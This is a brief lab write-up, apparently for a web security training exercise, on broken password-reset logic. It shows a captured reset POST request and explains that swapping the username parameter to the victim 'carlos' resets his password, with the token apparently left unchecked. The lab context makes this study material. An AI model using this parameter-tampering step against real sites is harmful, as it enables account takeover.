Title: Password reset broken logic
Desc: This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page. 
    Your credentials: wiener:peter
    Victim's username: carlos



![image](https://github.com/user-attachments/assets/c317ae3c-9ec1-4530-828a-e9ea91b858ba)

I have found the request to : `/forgot-password?temp-forgot-password-token=9fd3d8436huonsaff9dvywuy08izip6g`, request type `POST` and body of the request is
`temp-forgot-password-token=9fd3d8436huonsaff9dvywuy08izip6g&username=wiener&new-password-1=wiener&new-password-2=wiener`

I changed uername to carlos and that's all.

I am not sure if there was need to delete `temp-forgot-password-token` from request, I think that it is not validated by the server so there is no need to delete this parameter from request.


